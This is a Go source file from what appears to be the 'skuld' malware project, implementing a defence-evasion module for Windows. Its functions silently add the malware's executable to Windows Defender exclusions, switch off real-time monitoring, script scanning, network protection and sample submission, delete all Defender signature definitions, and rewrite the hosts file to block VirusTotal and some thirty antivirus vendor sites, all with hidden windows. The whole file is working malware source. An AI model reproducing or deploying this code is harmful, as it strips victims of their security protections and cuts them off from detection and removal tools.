package antivirus

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"

	"strings"

	"github.com/hackirby/skuld/utils/program"
)

func Run() {
	ExcludeFromDefender()
	DisableDefender()
	BlockSites([]string{
		"virustotal.com",
		"avast.com",
		"totalav.com",
		"scanguard.com",
		"totaladblock.com",
		"pcprotect.com",
		"mcafee.com",
		"bitdefender.com",
		"us.norton.com",
		"avg.com",
		"malwarebytes.com",
		"pandasecurity.com",
		"avira.com",
		"norton.com",
		"eset.com",
		"zillya.com",
		"kaspersky.com",
		"usa.kaspersky.com",
		"sophos.com",
		"home.sophos.com",
		"adaware.com",
		"bullguard.com",
		"clamav.net",
		"drweb.com",
		"emsisoft.com",
		"f-secure.com",
		"zonealarm.com",
		"trendmicro.com",
		"ccleaner.com",
	})
}

func ExcludeFromDefender() error {
	if !program.IsElevated() {
		return errors.New("not elevated")
	}
	path, err := os.Executable()
	if err != nil {
		return err
	}

	cmd := exec.Command("powershell", "-Command", "Add-MpPreference", "-ExclusionPath", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

func DisableDefender() error {
	if !program.IsElevated() {
		return errors.New("not elevated")
	}

	cmd := exec.Command("powershell", "Set-MpPreference", "-DisableIntrusionPreventionSystem", "$true", "-DisableIOAVProtection", "$true", "-DisableRealtimeMonitoring", "$true", "-DisableScriptScanning", "$true", "-EnableControlledFolderAccess", "Disabled", "-EnableNetworkProtection", "AuditMode", "-Force", "-MAPSReporting", "Disabled", "-SubmitSamplesConsent", "NeverSend")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	_, err := cmd.Output()
	if err != nil {
		return err
	}

	cmd = exec.Command("powershell", "Set-MpPreference", "-SubmitSamplesConsent", "2")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	_, err = cmd.Output()
	if err != nil {
		return err
	}

	cmd = exec.Command("cmd", "/c", fmt.Sprintf("%s\\Windows Defender\\MpCmdRun.exe", os.Getenv("ProgramFiles")), "-RemoveDefinitions", "-All")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	return cmd.Run()
}

func BlockSites(sites []string) error {
	if !program.IsElevated() {
		return errors.New("not elevated")
	}

	hostFilePath := filepath.Join(os.Getenv("systemroot"), "System32\\drivers\\etc\\hosts")

	data, err := os.ReadFile(hostFilePath)
	if err != nil {
		return err
	}

	newData := []string{}
	for _, line := range strings.Split(string(data), "\n") {
		for _, bannedSite := range sites {
			if strings.Contains(line, bannedSite) {
				continue
			}
		}
		newData = append(newData, line)
	}

	for _, bannedSite := range sites {
		newData = append(newData, "0.0.0.0 "+bannedSite)
		newData = append(newData, "0.0.0.0 www."+bannedSite)
	}

	d := strings.Join(newData, "\n")
	d = strings.ReplaceAll(d, "\n\n", "\n")

	cmd := exec.Command("attrib", "-r", hostFilePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	err = cmd.Run()
	if err != nil {
		return err
	}
	err = os.WriteFile(hostFilePath, []byte(d), 0644)
	if err != nil {
		return err
	}

	cmd = exec.Command("attrib", "+r", hostFilePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	return cmd.Run()
}
